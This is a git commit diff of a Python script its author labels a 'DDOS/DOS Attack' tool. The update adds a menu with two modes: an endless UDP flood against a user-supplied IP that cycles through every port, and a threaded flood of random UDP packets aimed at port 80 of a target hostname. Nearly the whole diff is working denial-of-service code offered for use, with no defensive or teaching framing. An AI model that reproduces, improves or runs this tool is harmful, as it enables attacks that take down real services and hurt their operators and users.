ec15ef523ca8c8ed843f9a701ad2d8ba5ca1b505
TLER AL-SHAHRANI | تلر الشهراني <mrsv1820@gmail.com>
2024-04-19 05:55:17 +0300

    Update DAK-TS.py

--- DAK-TS.py
+++ DAK-TS.py
@@ -53,45 +53,95 @@ print("""\033[1;31m
       ¶¶  ¶¶                                   ¶¶  ¶¶
        ¶¶¶¶                                     ¶¶¶¶
 
-                          \033[1;37mv0.0.0
-                        DDOS Attack
+                          \033[1;37mv0.1.0
+                      DDOS/DOS Attack
 
 THIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.
 PERSONAL WEBSITE : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html""")
 print("\033[1;37m- "*35)
 
-def create_rnd_msg(msg_size):
-	  rnd_msg = ""
-	  for i in range(0, msg_size):
-		    ch_rnd = random.randint(0, 255)
-		    rnd_msg += chr(ch_rnd)
-	  return rnd_msg
+def main_menu():
+    print("""\033[1;37m[\033[1;31m1\033[1;37m] - DDOS
+[\033[1;31m2\033[1;37m] - DOS
+[\033[1;31m99\033[1;37m] - Exit""")
 
-site = input("[\033[1;31m+\033[1;37m] Enter the target URL : \033[1;31m")
-if 'https://'in site: site=site.split('https://')[1]
-if '/'in site : site=site.split('/')[0]
+def handle_selection(selection):
+    if selection == "1"  or selection == "DDOS" or selection == "ddos":
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
 
-thread_count = int(input("\033[1;37m[\033[1;31m+\033[1;37m] Enter the num of requests on the target server : \033[1;31m"))
-ip = socket.gethostbyname(site)
+        ip = input("[\033[1;31m+\033[1;37m] Enter the target IP : \033[1;31m")
+        port = int(input("\033[1;37m[\033[1;31m+\033[1;37m] Enter the Port : \033[1;31m"))
 
-UDP_PORT = 80
+        sent = 0
 
-print(f"""
-\033[1;37m[\033[1;32m-\033[1;37m] Target URL : \033[1;31m{site}
+        while True:
+            sock.sendto(bytes, (ip, port))
+            sent = sent + 1
+            port = port + 1
+            print(f"\033[1;37m[\033[1;32m✓\033[1;37m] Sent successfuly \033[1;32m{sent}\033[1;37m!")
+
+            if port == 65534: port = 1
+
+        another_operation = input("\033[1;37mWould you like another operation? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
+        if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
+        elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
+        else:
+            print("\033[1;31mPlease choose a valid option!\033[1;37m")
+            exit()
+            
+    if selection == "2"  or selection == "DOS" or selection == "dos":
+        def create_rnd_msg(msg_size):
+            rnd_msg = ""
+            for i in range(0, msg_size):
+                ch_rnd = random.randint(0, 255)
+                rnd_msg += chr(ch_rnd)
+            return rnd_msg
+
+        url = input("[\033[1;31m+\033[1;37m] Enter the target URL : \033[1;31m")
+        if "https://" in url: url = url.split("https://")[1]
+        if "/" in url: url = url.split("/")[0]
+
+        thread_count = int(input("\033[1;37m[\033[1;31m+\033[1;37m] Enter the num of requests on the target server : \033[1;31m"))
+        ip = socket.gethostbyname(url)
+
+        UDP_PORT = 80
+
+        print(f"""
+\033[1;37m[\033[1;32m-\033[1;37m] Target URL : \033[1;31m{url}
 \033[1;37m[\033[1;32m-\033[1;37m] Target IP : \033[1;31m{ip}
 \033[1;37m[\033[1;32m-\033[1;37m] Protocol : \033[1;31mUDP
-\033[1;37m[\033[1;32m-\033[1;37m] Target port : \033[1;31m{UDP_PORT}""")
+\033[1;37m[\033[1;32m-\033[1;37m] Target port : \033[1;31m{UDP_PORT}\n""")
 
-i = 0
+        i = 0
 
-def ddos():
-		MESSAGE = str.encode(create_rnd_msg(8))
-		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		sock.sendto(MESSAGE, (ip, UDP_PORT))
-		print(f"\n\r\033[1;37m[\033[1;32m✓\033[1;37m] Sent successfuly \033[1;32m{i}\033[1;37m!", end='')	
+        def dos():
+            MESSAGE = str.encode(create_rnd_msg(8))
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.sendto(MESSAGE, (ip, UDP_PORT))
 
-thread_count = thread_count+1
+            print(f"\r\033[1;37m[\033[1;32m✓\033[1;37m] Sent successfuly \033[1;32m{i}\033[1;37m!", end="")
 
-for i in range(thread_count):
-	  try: threading.Thread(target=ddos).start()	
-	  except KeyboardInterrupt: exit()
+        thread_count = thread_count + 1
+        
+        try: 
+            for i in range(thread_count): threading.Thread(target=dos).start()	
+        finally:
+            another_operation = input("\n\033[1;37mWould you like another operation? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
+            if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
+            elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
+            else:
+                print("\033[1;31mPlease choose a valid option!\033[1;37m")
+                exit()
+
+    elif selection == "99" or selection == "EXIT" or selection == "exit": exit()
+    else: print("\033[1;31mPlease choose a valid option!")
+
+def main():
+    main_menu()
+
+    while True:
+        user_input = input("\033[1;37mChoose : ")
+        handle_selection(user_input)
+
+if __name__ == "__main__": main()
